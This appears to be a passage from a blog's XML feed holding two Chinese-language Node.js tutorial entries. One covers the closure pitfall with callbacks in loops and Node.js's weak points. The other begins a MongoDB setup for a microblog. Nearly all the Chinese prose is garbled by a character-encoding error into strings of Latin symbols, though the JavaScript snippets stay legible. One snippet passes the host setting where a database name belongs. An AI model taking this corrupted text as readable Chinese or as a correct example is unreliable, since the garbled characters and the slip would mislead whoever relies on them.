æƒ¯ä»¥åŽå°±ä¼šå‘çŽ°è¿˜æ˜¯å¾ˆç®€å•çš„ã€‚ç„¶è€Œè¿™ä¹‹ä¸­å…¶å®žæš—è—äº†ä¸å°‘é™·é˜±ï¼Œä¸€ä¸ªå¾ˆå®¹æ˜“é‡åˆ°çš„é—®é¢˜å°±æ˜¯å¾ªçŽ¯ä¸­çš„å›žè°ƒå‡½æ•°ï¼Œåˆå­¦è€…ç»å¸¸å®¹æ˜“é™·å…¥è¿™ä¸ªåœˆå¥—ã€‚è®©æˆ‘ä»¬ä»Žä¸€ä¸ªä¾‹å­å¼€å§‹è¯´æ˜Žè¿™ä¸ªé—®é¢˜ã€‚ 123456789//forloop.jsvar fs = require('fs');var files = ['a.txt','b.txt','c.txt'];for(var i = 0; i &lt; files.length; i++)&#123; fs.readFile(files[i],'utf-8',function(err,contents)&#123; console.log(files[i]+ ':' + contents); &#125;);&#125; è¿™æ®µä»£ç çš„åŠŸèƒ½å¾ˆç›´è§‚ï¼Œå°±æ˜¯ä¾æ¬¡è¯»å–æ–‡ä»¶ a.txtã€b.txtã€c.txtï¼Œå¹¶è¾“å‡ºæ–‡ä»¶åå’Œå†…å®¹ã€‚å‡è®¾è¿™ä¸‰ä¸ªæ–‡ä»¶çš„å†…å®¹åˆ†åˆ«æ˜¯ AAAã€BBB å’Œ CCCï¼Œé‚£ä¹ˆæˆ‘ä»¬æœŸæœ›çš„è¾“å‡ºç»“æžœå°±æ˜¯ï¼š 123a.txt: AAAb.txt: BBBc.txt: CCC è€Œå®žé™…ä¸Šè¿è¡Œä»£ç åŽï¼Œå¾—åˆ°çš„æ˜¯ 123undefined: AAAundefined: BBBundefined: CCC åœ¨è¯»å–æ–‡ä»¶çš„å›žè°ƒå‡½æ•°ä¸­åˆ†åˆ«è¾“å‡º files ã€ i å’Œ files[i] ã€‚ å¯ä»¥å‘çŽ°ä¸‰æ¬¡è¾“å‡ºçš„i éƒ½æ˜¯3ï¼Œè¶…å‡ºäº† files æ•°ç»„çš„ä¸‹æ ‡ï¼Œå› ä¸ºå¾—åˆ°çš„ files[i] å°±éƒ½æ˜¯ undefined ã€‚è¯´æ˜Žäº† fs.readFile çš„å›žè°ƒå‡½æ•°ä¸­è®¿é—®åˆ°çš„ i å€¼éƒ½æ˜¯å¾ªçŽ¯é€€å‡ºä»¥åŽçš„ï¼Œå› æ­¤ä¸èƒ½åˆ†è¾¨ï¼Œå¯ä»¥é€šè¿‡é—­åŒ…æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ä»£ç å¦‚ä¸‹ï¼š 123456789var fs = require('fs');var files = ['a.txt','b.txt','c.txt'];for(var i = 0; i &lt; files.length; i++)&#123; (function(i)&#123; fs.readFile(files[i],'utf-8',function(err,contents)&#123; console.log(files[i]+ ':' + contents); &#125;); &#125;)(i)&#125; ä¸Šé¢ä»£ç åœ¨ for å¾ªçŽ¯ä½“ä¸­å»ºç«‹äº†ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå°†å¾ªçŽ¯è¿­ä»£å˜é‡ i ä½œä¸ºå‡½æ•°çš„å‚æ•°ä¼ é€’å¹¶è°ƒç”¨ã€‚ç”±äºŽè¿è¡Œæ—¶é—­åŒ…çš„å­˜åœ¨ï¼Œè¯¥åŒ¿åå‡½æ•°ä¸­å®šä¹‰çš„å˜é‡ï¼ˆåŒ…æ‹¬å‚æ•°è¡¨ï¼‰åœ¨å®ƒå†…éƒ¨çš„å‡½æ•°ï¼ˆ fs.readFile çš„å›žè°ƒå‡½æ•°ï¼‰æ‰§è¡Œå®Œæ¯•ä¹‹å‰éƒ½ä¸ä¼šé‡Šæ”¾ï¼Œå› æ­¤æˆ‘ä»¬åœ¨å…¶ä¸­è®¿é—®åˆ°çš„ i å°±åˆ†åˆ«æ˜¯ä¸åŒçš„é—­åŒ…å®žä¾‹ï¼Œè¿™ä¸ªå®žä¾‹æ˜¯åœ¨å¾ªçŽ¯ä½“æ‰§è¡Œçš„è¿‡ç¨‹ä¸­åˆ›å»ºçš„ï¼Œä¿ç•™äº†ä¸åŒçš„å€¼ã€‚äº‹å®žä¸Šä»¥ä¸Šè¿™ç§å†™æ³•å¹¶ä¸å¸¸è§ï¼Œå› ä¸ºå®ƒé™ä½Žäº†ç¨‹åºçš„å¯è¯»æ€§ï¼Œæ•…ä¸æŽ¨èä½¿ç”¨ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥ç”¨æ•°ç»„çš„ forEach æ–¹æ³•è§£å†³è¿™ä¸ªé—®é¢˜ï¼š 123456789101112//callbackforeach.js// callbackforeach.jsvar fs = require('fs');var files = ['a.txt','b.txt','c.txt'];files.forEach(function(filename)&#123; fs.readFile(filename,'utf-8',function(err,contents)&#123; console.log(filename + ':' + contents ); &#125;);&#125;); è§£å†³æŽ§åˆ¶æµéš¾é¢˜é™¤äº†å¾ªçŽ¯çš„é™·é˜±ï¼ŒNode.js å¼‚æ­¥å¼ç¼–ç¨‹è¿˜æœ‰ä¸€ä¸ªæ˜¾è‘—çš„é—®é¢˜ï¼Œå³æ·±å±‚çš„å›žè°ƒå‡½æ•°åµŒå¥—ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¾ˆéš¾åƒçœ‹åŸºæœ¬æŽ§åˆ¶æµç»“æž„ä¸€æ ·ä¸€çœ¼çœ‹æ¸…å›žè°ƒå‡½æ•°ä¹‹é—´çš„å…³ç³»ï¼Œå› æ­¤å½“ç¨‹åºè§„æ¨¡æ‰©å¤§æ—¶å¿…é¡»é‡‡å–æ‰‹æ®µé™ä½Žè€¦åˆåº¦ï¼Œä»¥å®žçŽ°æ›´åŠ ä¼˜ç¾Žã€å¯è¯»çš„ä»£ç ã€‚è¿™ä¸ªé—®é¢˜æœ¬èº«æ²¡æœ‰ç«‹ç«¿è§å½±çš„è§£å†³æ–¹æ³•ï¼Œåªèƒ½é€šè¿‡æ”¹å˜è®¾è®¡æ¨¡å¼ï¼Œæ—¶åˆ»æ³¨æ„é™ä½Žé€»è¾‘ä¹‹é—´çš„è€¦åˆå…³ç³»æ¥è§£å†³ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰è®¸å¤šé¡¹ç›®è¯•å›¾è§£å†³è¿™ä¸€éš¾é¢˜ã€‚async æ˜¯ä¸€ä¸ªæŽ§åˆ¶æµè§£è€¦æ¨¡å—ï¼Œå®ƒæä¾›äº†async.series ã€ async.parallel ã€ async.waterfall ç­‰å‡½æ•°ï¼Œåœ¨å®žçŽ°å¤æ‚çš„é€»è¾‘æ—¶ä½¿ç”¨è¿™äº›å‡½æ•°ä»£æ›¿å›žè°ƒå‡½æ•°åµŒå¥—å¯ä»¥è®©ç¨‹åºå˜å¾—æ›´æ¸…æ™°å¯è¯»ä¸”æ˜“äºŽç»´æŠ¤ï¼Œä½†ä½ å¿…é¡»éµå¾ªå®ƒçš„ç¼–ç¨‹é£Žæ ¼ã€‚ streamlinejså’Œjscexåˆ™é‡‡ç”¨äº†æ›´é«˜çº§çš„æ‰‹æ®µï¼Œå®ƒçš„æ€æƒ³æ˜¯â€œå˜åŒæ­¥ä¸ºå¼‚æ­¥â€ï¼Œå®žçŽ°äº†ä¸€ä¸ªJavaScript åˆ°JavaScript çš„ç¼–è¯‘å™¨ï¼Œä½¿ç”¨æˆ·å¯ä»¥ç”¨åŒæ­¥ç¼–ç¨‹çš„æ¨¡å¼å†™ä»£ç ï¼Œç¼–è¯‘åŽæ‰§è¡Œæ—¶å´æ˜¯å¼‚æ­¥çš„ã€‚eventproxy çš„æ€è·¯ä¸Žå‰é¢ä¸¤è€…åŒºåˆ«æ›´å¤§ï¼Œå®ƒå®žçŽ°äº†å¯¹äº‹ä»¶å‘å°„å™¨çš„æ·±åº¦å°è£…ï¼Œé‡‡ç”¨ä¸€ç§å®Œå…¨åŸºäºŽäº‹ä»¶æ¾æ•£è€¦åˆçš„æ–¹å¼æ¥å®žçŽ°æŽ§åˆ¶æµçš„æ¢³ç†ã€‚æ— è®ºæ˜¯ä»¥ä¸Šå“ªç§è§£å†³æ‰‹æ®µï¼Œéƒ½ä¸æ˜¯â€œéžä¾µå…¥æ€§çš„â€ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå¯¹ä½ ç¼–ç¨‹æ¨¡å¼çš„å½±å“æ˜¯éžå¸¸å¤§çš„ï¼Œä½ å‡ ä¹Žä¸å¯èƒ½æ— ä»£ä»·åœ°åœ¨ä½¿ç”¨äº†ä¸€ç§æ¨¡å¼å¾ˆä¹…ä»¥åŽä»Žå®¹åœ°æ¢æˆå¦ä¸€ç§æ¨¡å¼ï¼Œæˆ–è€…ç›´æŽ¥ç³…åˆä½¿ç”¨ä¸¤ç§æ¨¡å¼ã€‚è€Œä¸”å®ƒä»¬éƒ½æ˜¯åœ¨è§£å†³äº†æ·±å±‚åµŒå¥—çš„å›žè°ƒå‡½æ•°å¯è¯»æ€§é—®é¢˜çš„åŒæ—¶ï¼Œå¼•å…¥äº†å…¶ä»–å¤æ‚çš„è¯­æ³•ï¼Œå¸¦æ¥äº†å¦ä¸€ç§å¯è¯»æ€§çš„é™ä½Žã€‚æ‰€ä»¥ï¼Œæ˜¯å¦ä½¿ç”¨ï¼Œä½¿ç”¨å“ªç§æ–¹æ¡ˆï¼Œåœ¨å†³å®šä¹‹å‰æ˜¯éœ€è¦ä»”ç»†æ–Ÿé…Œç ”ç©¶çš„ã€‚ Node.js ä¸é€‚åˆåšä»€ä¹ˆè®¡ç®—å¯†é›†åž‹çš„ç¨‹åºç†æƒ³æƒ…å†µä¸‹ï¼ŒNode.jså•çº¿ç¨‹åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ä¼šå°†ä¸€ä¸ªCPUæ ¸å¿ƒå®Œå…¨å æ»¡ï¼Œæ‰€æœ‰çš„è¯·æ±‚å¿…é¡»ç­‰å¾…å½“å‰è¯·æ±‚å¤„ç†å®Œæ¯•ä»¥åŽè¿›å…¥äº‹ä»¶å¾ªçŽ¯æ‰èƒ½å“åº”ã€‚å¦‚æžœä¸€ä¸ªåº”ç”¨æ˜¯è®¡ç®—å¯†é›†åž‹çš„ï¼Œé‚£ä¹ˆé™¤éžä½ æ‰‹åŠ¨å°†å®ƒæ‹†æ•£ï¼Œå¦åˆ™è¯·æ±‚å“åº”å»¶è¿Ÿå°†ä¼šç›¸å½“å¤§ã€‚ ä¾‹å¦‚ï¼ŒæŸä¸ªäº‹ä»¶çš„å›žè°ƒå‡½æ•°ä¸­è¦è¿›è¡Œå¤æ‚çš„è®¡ç®—ï¼Œå ç”¨CPU 200æ¯«ç§’ï¼Œé‚£ä¹ˆäº‹ä»¶å¾ªçŽ¯ä¸­æ‰€æœ‰çš„è¯·æ±‚éƒ½è¦ç­‰å¾…200æ¯«ç§’ã€‚ä¸ºäº†æé«˜å“åº”é€Ÿåº¦ï¼Œä½ å”¯ä¸€çš„åŠžæ³•å°±æ˜¯æŠŠè¿™ä¸ªè®¡ç®—å¯†é›†çš„éƒ¨åˆ†æ‹†æˆè‹¥å¹²ä¸ªé€»è¾‘ï¼Œè¿™ç»™ç¼–ç¨‹å¸¦æ¥äº†é¢å¤–çš„å¤æ‚æ€§ã€‚å³ä½¿è¿™æ ·ï¼Œç³»ç»Ÿçš„æ€»åžåé‡å’Œæ€»å“åº”å»¶è¿Ÿä¹Ÿä¸ä¼šé™ä½Žï¼Œåªæ˜¯è°ƒåº¦ç¨å¾®å…¬å¹³äº†ä¸€äº›ã€‚ å•ç”¨æˆ·å¤šä»»åŠ¡åž‹åº”ç”¨å‰é¢æˆ‘ä»¬è®¨è®ºçš„é€šå¸¸éƒ½æ˜¯æœåŠ¡å™¨ç«¯ç¼–ç¨‹ï¼Œå…¶ä¸­ä¸€ä¸ªå‡è®¾å°±æ˜¯ç”¨æˆ·æ•°é‡å¾ˆå¤šã€‚ä½†å¦‚æžœé¢å¯¹çš„æ˜¯å•ç”¨æˆ·ï¼Œè­¬å¦‚æœ¬åœ°çš„å‘½ä»¤è¡Œå·¥å…·æˆ–è€…å›¾å½¢ç•Œé¢ï¼Œé‚£ä¹ˆæ‰€è°“çš„å¤§é‡å¹¶å‘è¯·æ±‚å°±ä¸å­˜åœ¨äº†ã€‚äºŽæ˜¯å¦ä¸€ä¸ªææ€–çš„é—®é¢˜å‡ºçŽ°äº†ï¼Œå°½ç®¡æ˜¯å•ç”¨æˆ·ï¼Œå´ä¸ä¸€å®šæ˜¯å•ä»»åŠ¡ã€‚ä¾‹å¦‚ç»™ç”¨æˆ·æä¾›ç•Œé¢çš„åŒæ—¶åŽå°åœ¨è¿›è¡ŒæŸä¸ªè®¡ç®—ï¼Œä¸ºäº†è®©ç”¨æˆ·ç•Œé¢ä¸å‡ºçŽ°é˜»å¡žçŠ¶æ€ï¼Œä½ ä¸å¾—ä¸å¼€å¯å¤šçº¿ç¨‹æˆ–å¤šè¿›ç¨‹ã€‚è€ŒNode.js çº¿ç¨‹æˆ–è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡åˆ°ç›®å‰ä¸ºæ­¢è¿˜å¾ˆä¸ä¾¿ï¼Œå› ä¸ºå®ƒæ ¹æœ¬æ²¡æœ‰é”ï¼Œå› è€Œå·ç§°ä¸ä¼šæ­»é”ã€‚Node.js çš„å¤šè¿›ç¨‹å¾€å¾€æ˜¯åœ¨æ‰§è¡ŒåŒä¸€ä»»åŠ¡ï¼Œé€šè¿‡å¤šè¿›ç¨‹åˆ©ç”¨å¤šå¤„ç†å™¨çš„èµ„æºï¼Œä½†é‡åˆ°å¤šè¿›ç¨‹ç›¸äº’åä½œæ—¶ï¼Œå°±æ˜¾å¾—æ‰è¥Ÿè§è‚˜äº†ã€‚ é€»è¾‘ååˆ†å¤æ‚çš„äº‹åŠ¡Node.js çš„æŽ§åˆ¶æµä¸æ˜¯çº¿æ€§çš„ï¼Œå®ƒè¢«ä¸€ä¸ªä¸ªäº‹ä»¶æ‹†æ•£ï¼Œä½†äººçš„æ€ç»´å´æ˜¯çº¿æ€§çš„ï¼Œå½“ä½ è¯•å›¾è½¬æ¢æ€ç»´æ¥è¿Žåˆè¯­è¨€æˆ–ç¼–è¯‘å™¨æ—¶ï¼Œå°±ä¸å¾—ä¸ä½œå‡ºç‰ºç‰²ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œä½ è¦å®žçŽ°ä¸€ä¸ªè¿™æ ·çš„é€»è¾‘ï¼šä»Žé“¶è¡Œå–é’±ï¼Œæ‹¿é’±åŽ»è´­ä¹°æŸä¸ªè™šæ‹Ÿå•†å“ï¼Œä¹°å®Œä»¥åŽåŠ å…¥åº“å­˜æ•°æ®åº“ï¼Œè¿™ä¸­é—´çš„ä»»ä½•ä¸€æ­¥éƒ½å¯èƒ½ä¼šæ¶‰åŠæ•°åæ¬¡çš„I/Oæ“ä½œï¼Œè€Œä¸”ä»»ä½•ä¸€æ¬¡æ“ä½œå¤±è´¥ä»¥åŽéƒ½è¦è¿›è¡Œå›žæ»šæ“ä½œã€‚è¿™ä¸ªè¿‡ç¨‹æ˜¯çº¿æ€§çš„ï¼Œå·²ç»å¾ˆå¤æ‚äº†ï¼Œå¦‚æžœè¦æ‹†åˆ†ä¸ºéžçº¿æ€§çš„é€»è¾‘ï¼Œé‚£ä¹ˆå…¶å¤æ‚ç¨‹åº¦å¾ˆå¯èƒ½å°±è¾¾åˆ°æ— æ³•ç»´æŠ¤çš„åœ°æ­¥äº†ã€‚Node.jsæ›´å–„äºŽå¤„ç†é‚£äº›é€»è¾‘ç®€å•ä½†è®¿é—®é¢‘ç¹çš„ä»»åŠ¡ï¼Œè€Œä¸é€‚åˆå®Œæˆé€»è¾‘ååˆ†å¤æ‚çš„å·¥ä½œã€‚ åˆ°è¿™é‡Œ å…³äºŽ nodejs å¼€å‘æŒ‡å—è¿™æœ¬ä¹¦å°±ç®—é˜…è¯»å®Œäº†ï¼Œé€šè¿‡è¿™æœ¬ä¹¦ï¼Œå¤§æ¦‚åœ°äº†è§£äº†NodeJSçš„ç‰¹æ€§ï¼Œé€šè¿‡node+express+mongodb æ­å»ºäº†ä¸€ä¸ªå¾®åšçš„é›å½¢å®žä¾‹ï¼Œå¸Œæœ›åŽé¢æœ‰æœºä¼šå¯ä»¥å®Œå–„å®ƒã€‚è¿™æœ¬ä¹¦é™„å½•è¿˜æœ‰JavaScriptçš„ä¸€äº›ç‰¹æ€§ä»¥åŠNode.js ç¼–ç¨‹çš„è§„èŒƒï¼Œå¦‚æžœæœ‰ä»·å€¼å†ç¨åŽæ€»ç»“å­¦ä¹ ã€‚]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¥½çŽ©çš„Nodejs â€”â€” ä½¿ç”¨ Node.jsè¿›è¡Œ Web å¼€å‘ï¼ˆä¸‹ï¼‰]]></title>
    <url>%2F2018-10-11-NodeJs-Part5%E4%B8%8B.html</url>
    <content type="text"><![CDATA[å›½åº†å›žå®¶å› ä¸ºæ‹œè®¿åšå®¢çš„åŽŸå› ï¼Œæ²¡æœ‰æ—¶é—´å¯ä»¥æ›´æ–°ï¼Œå›žæ¥åˆè¦å¼€å§‹èµ¶é¡¹ç›®ï¼Œä»Šå¤©è¶ç€åŽç«¯åŽ»å¼€ä¼šæŠŠä¸»æœºéƒ½æ‹”äº†ã€‚æŠŠç”¨æˆ·æ³¨å†Œå’Œç™»å½•ä»¥åŠå‘è¡¨å¾®åšçš„åŠŸèƒ½ç»™è§£å†³äº†ã€‚ ä½¿ç”¨ Node.js è¿›è¡Œ Web å¼€å‘ï¼ˆä¸‹ï¼‰ç”¨æˆ·æ³¨å†Œå’Œç™»å½•åœ¨ä¸Šä¸€èŠ‚æˆ‘ä»¬ä½¿ç”¨ Bootstrap åˆ›å»ºäº†ç½‘ç«™çš„åŸºæœ¬æ¡†æž¶ã€‚åœ¨è¿™ä¸€èŠ‚æˆ‘ä»¬è¦å®žçŽ°ç”¨æˆ·ä¼šè¯çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬ç”¨æˆ·æ³¨å†Œå’Œç™»å½•çŠ¶æ€çš„ç»´æŠ¤ã€‚ä¸ºäº†å®žçŽ°è¿™äº›åŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦å¼•å…¥ä¼šè¯æœºåˆ¶æ¥è®°å½•ç”¨æˆ·çŠ¶æ€ï¼Œè¿˜è¦è®¿é—®æ•°æ®åº“æ¥ä¿å­˜å’Œè¯»å–ç”¨æˆ·ä¿¡æ¯ã€‚çŽ°åœ¨å°±è®©æˆ‘ä»¬ä»Žæ•°æ®åº“å¼€å§‹ã€‚ è®¿é—®æ•°æ®åº“é€‰ç”¨ MongoDB ä½œä¸ºç½‘ç«™çš„æ•°æ®åº“ç³»ç»Ÿï¼Œå®ƒæ˜¯ä¸€ä¸ªå¼€æºçš„ NoSQL æ•°æ®åº“ï¼Œç›¸æ¯” MYSQL é‚£æ ·çš„å…³ç³»åž‹æ•°æ®åº“ï¼Œå®ƒæ›´ä¸ºè½»å·§ï¼Œçµæ´»ï¼Œéžå¸¸é€‚åˆåœ¨æ•°æ®è§„æ¨¡å¾ˆå¤§ã€äº‹åŠ¡æ€§ä¸å¼ºçš„åœºåˆä½¿ç”¨ã€‚ NoSQLåœ¨ä¼ ç»Ÿçš„æ•°æ®åº“ä¸­ï¼Œæ•°æ®åº“çš„æ ¼å¼æ˜¯ç”±è¡¨ï¼ˆtableï¼‰ã€è¡Œï¼ˆrowï¼‰ã€å­—æ®µï¼ˆfieldï¼‰ç»„æˆçš„ã€‚è¡¨å…·æœ‰å›ºå®šçš„ç»“æž„ï¼Œè§„å®šäº†æ¯è¡Œæœ‰å“ªäº›å­—æ®µï¼Œåœ¨åˆ›å»ºæ—¶è¢«å®šä¹‰ï¼Œä¹‹åŽä¿®æ”¹å¾ˆå›°éš¾ã€‚è¡Œçš„æ ¼å¼æ˜¯ç›¸åŒçš„ï¼Œç”±è‹¥å¹²ä¸ªå›ºå®šçš„å­—æ®µç»„æˆçš„ã€‚æ¯ä¸ªè¡¨å¯èƒ½æœ‰è‹¥å¹²ä¸ªå­—æ®µä½œä¸ºç´¢å¼•ï¼ˆindexï¼‰,è¿™å…¶ä¸­æœ‰ç‚¹æ˜¯ä¸»é”®ï¼ˆprimary keyï¼‰ï¼Œç”¨äºŽä¸Žçº¦æŸè¡¨ä¸­çš„æ•°æ®ï¼Œè¿˜æœ‰ä¸€ä¸ªå”¯ä¸€é”®ï¼ˆunique keyï¼‰ï¼Œç¡®ä¿å­—æ®µä¸­ä¸å­˜æ”¾é‡å¤æ•°æ®ã€‚è¡¨å’Œè¡¨ä¹‹é—´å¯èƒ½è¿˜æœ‰ç›¸äº’çš„çº¦æŸï¼Œç§°ä¸ºå¤–é”®ï¼ˆforeign key ï¼‰ã€‚å¯¹æ•°æ®åº“çš„æ¯æ¬¡æŸ¥è¯¢éƒ½è¦ä»¥è¡Œä¸ºå•ä½ï¼Œå¤æ‚çš„æŸ¥è¯¢åŒ…æ‹¬åµŒå¥—æŸ¥è¯¢ã€è¿žæŽ¥æŸ¥è¯¢å’Œäº¤å‰è¡¨æŸ¥è¯¢ã€‚ æ‹¥æœ‰è¿™äº›åŠŸèƒ½çš„æ•°æ®åº“è¢«ç§°ä¸ºå…³ç³»åž‹æ•°æ®åº“ï¼Œå…³ç³»åž‹æ•°æ®åº“é€šå¸¸ä½¿ç”¨ä¸€ç§å«åš SQL ï¼ˆStructured Query Languageï¼‰ çš„æŸ¥è¯¢è¯­è¨€ä½œä¸ºæŽ¥å£ï¼Œå› æ­¤åˆè¢«ç§°ä¸º SQL æ•°æ®åº“ã€‚å…¸åž‹çš„ SQL æ•°æ®åº“æœ‰ MySQLã€Oracleã€Microsoft SQL Serverã€PostgreSQLã€SQLiteï¼Œç­‰ç­‰ã€‚ NoSQL æ˜¯ 1998 å¹´è¢«æå‡ºçš„ï¼Œå®ƒæ›¾ç»æ˜¯ä¸€ä¸ªè½»é‡ã€å¼€æºã€ä¸æä¾›SQLåŠŸèƒ½çš„å…³ç³»æ•°æ®åº“ã€‚ä½†çŽ°åœ¨ NoSQL è¢«è®¤ä¸ºæ˜¯ Not Only SQL çš„ç®€ç§°ï¼Œä¸»è¦æŒ‡éžå…³ç³»åž‹ã€åˆ†å¸ƒå¼ã€ä¸æä¾› ACID çš„æ•°æ®åº“ç³»ç»Ÿã€‚æ­£å¦‚å®ƒçš„åç§°æ‰€æš—ç¤ºçš„ï¼ŒNoSQL è®¾è®¡åˆè¡·å¹¶ä¸æ˜¯ä¸ºäº†å–ä»£ SQL æ•°æ®åº“çš„ï¼Œè€Œæ˜¯ä½œä¸ºä¸€ä¸ªè¡¥å……ï¼Œå®ƒå’Œ SQL æ•°æ®åº“æœ‰ç€å„è‡ªä¸åŒçš„é€‚åº”é¢†åŸŸã€‚NoSQL ä¸åƒ SQL æ•°æ®åº“ä¸€æ ·éƒ½æœ‰ç€ç»Ÿä¸€çš„æž¶æž„å’ŒæŽ¥å£ï¼Œä¸åŒçš„ NoSQL æ•°æ®åº“ç³»ç»Ÿä»Žé‡Œåˆ°å¤–å¯èƒ½å®Œå…¨ä¸åŒã€‚ MongoDBMongoDB æ˜¯ä¸€ä¸ªå¯¹è±¡æ•°æ®åº“ï¼Œå®ƒæ²¡æœ‰è¡¨ã€è¡Œç­‰æ¦‚å¿µï¼Œä¹Ÿæ²¡æœ‰å›ºå®šçš„æ¨¡å¼å’Œç»“æž„ï¼Œæ‰€æœ‰çš„æ•°æ®ä»¥æ–‡æ¡£çš„å½¢å¼å­˜å‚¨ã€‚æ‰€è°“çš„æ–‡æ¡£å°±æ˜¯ä¸€ä¸ªå…³è”æ•°ç»„å¼çš„å¯¹è±¡ï¼Œå®ƒçš„å†…éƒ¨ç”±å±žæ€§ç»„æˆï¼Œä¸€ä¸ªå±žæ€§å¯¹åº”ä¸€ä¸ªæ•°ã€å­—ç¬¦ä¸²ã€æ—¥æœŸã€æ•°ç»„ã€ç”šè‡³æ˜¯ä¸€ä¸ªåµŒå¥—çš„æ–‡æ¡£ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ª MongoDB æ–‡æ¡£çš„å®žä¾‹ 1234567891011&#123; "_id" : ObjectId( "4f7fe8432b4a1077a7c551e8" ), "uid" : 2018, "username" : "lbh", "net9" : &#123; "nickname" : "lbh", "surname" : "lbh", "givenname" : "lbh", "fullname" : "lbh", "emails" : [ "544289495@qq.com"], "website" : "http://laibh.top", "address" : "GuangDong University" &#125;&#125; ä¸Šé¢æ–‡æ¡£ä¸­ uid æ˜¯ä¸€ä¸ªæ•´æ•°å±žæ€§ï¼Œ username æ˜¯å­—ç¬¦ä¸²å±žæ€§ï¼Œ _id æ˜¯æ–‡æ¡£å¯¹è±¡çš„æ ‡è¯†ç¬¦ï¼Œæ ¼å¼ä¸ºç‰¹å®šçš„ ObjectId ã€‚ net9 æ˜¯ä¸€ä¸ªåµŒå¥—çš„æ–‡æ¡£ï¼Œå…¶å†…éƒ¨ç»“æž„ä¸Žä¸€èˆ¬æ–‡æ¡£æ— å¼‚ã€‚ä»Žæ ¼å¼æ¥çœ‹æ–‡æ¡£å¥½åƒ JSONï¼Œæ²¡é”™ï¼ŒMongoDB çš„æ•°æ®æ ¼å¼å°±æ˜¯ JSONï¼ˆå‡†ç¡®åœ°è¯´ï¼ŒMongoDB çš„æ•°æ®æ ¼å¼æ˜¯ BSON ï¼ˆBinary JSONï¼‰ï¼Œå®ƒæ˜¯ JSON çš„ä¸€ä¸ªæ‰©å±•ã€‚ï¼‰ ï¼Œå› æ­¤ä¸Ž JavaScript çš„äº²å’Œæ€§å¾ˆå¼ºã€‚åœ¨Mongodb ä¸­å¯¹æ•°æ®çš„æ“ä½œéƒ½æ˜¯ä»¥æ–‡æ¡£ä¸ºå•ä½çš„ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä¿®æ”¹æ–‡æ¡£çš„éƒ¨åˆ†å±žæ€§ã€‚å¯¹äºŽæŸ¥è¯¢æ“ä½œï¼Œæˆ‘ä»¬åªéœ€è¦æŒ‡å®šæ–‡æ¡£çš„ä»»ä½•ä¸€ä¸ªå±žæ€§ï¼Œå°±å¯åœ¨æ•°æ®åº“ä¸­å°†æ»¡è¶³æ¡ä»¶çš„æ‰€æœ‰æ–‡æ¡£ç­›é€‰å‡ºæ¥ã€‚ä¸ºäº†åŠ å¿«æŸ¥è¯¢ï¼ŒMongoDB ä¹Ÿå¯¹æ–‡æ¡£å®žçŽ°äº†ç´¢å¼•ï¼Œè¿™ä¸€ç‚¹å’Œ SQL æ•°æ®åº“ä¸€æ ·ã€‚ è¿žæŽ¥æ•°æ®åº“åœ¨æœ¬åœ°å®‰è£… MongoDB ,ç‚¹å‡» http://www.mongodb.org/ åŽ»å®˜ç½‘ä¸‹è½½ã€‚æŽ¥ç€åœ¨é¡¹ç›®é‡Œé¢ï¼Œä½¿ç”¨å‘½ä»¤ 12345// å…¨å±€å®‰è£…é©±åŠ¨npm install mongodb -g// åœ¨å½“å‰é¡¹ç›®ä¸­å¼•å…¥mongodbnpm install mongodb --save æŽ¥ä¸‹æ¥åœ¨å·¥ç¨‹çš„ç›®å½•ä¸­åˆ›å»º settings.js æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶ç”¨äºŽä¿å­˜æ•°æ®åº“çš„è¿žæŽ¥ä¿¡æ¯ã€‚æˆ‘ä»¬å°†ç”¨åˆ°çš„æ•°æ®åº“å‘½åä¸º microblogï¼Œæ•°æ®åº“æœåŠ¡å™¨åœ¨æœ¬åœ°ï¼Œå› æ­¤Settings.jsæ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š 12345module.exports = &#123; cookieSecret: 'microblogbyvoid', db: 'microblog', host: 'localhost',&#125;; å…¶ä¸­ï¼Œ db æ˜¯æ•°æ®åº“çš„åç§°ï¼Œ host æ˜¯æ•°æ®åº“çš„åœ°å€ã€‚ cookieSecret ç”¨äºŽ Cookie åŠ å¯†ä¸Žæ•°æ®åº“æ— å…³,ç•™ä½œåŽé¢æœ‰ä½œç”¨ã€‚ æŽ¥ä¸‹æ¥åœ¨ models å­ç›®å½•ä¸­åˆ›å»º db.jsï¼Œå†…å®¹æ˜¯ï¼š 123456var settings = require('../settings');var Db = require('mongodb').Db;var Connection = require('mongodb').Connection;var Server = require('mongodb').Server;module.exports = new Db(settings.host, new Server(Connection.DEFAULT_PORT, &#123;&#125;)); ä»¥ä¸Šä»£ç é€šè¿‡ module.exports è¾“å‡ºäº†åˆ›å»ºçš„æ•°æ®åº“è¿žæŽ¥ï¼Œåœ¨åŽé¢çš„å°èŠ‚ä¸­æˆ‘ä»¬ä¼šç”¨åˆ°è¿™ä¸ªæ¨¡å—ã€‚ç”±äºŽæ¨¡å—åªä¼šè¢«åŠ è½½ä¸€æ¬¡ï¼Œä»¥åŽæˆ‘ä»¬åœ¨å…¶ä»–æ–‡ä»¶ä¸­ä½¿ç”¨æ—¶å‡ä¸ºè¿™ä¸€ä¸ªå®žä¾‹ã€‚ 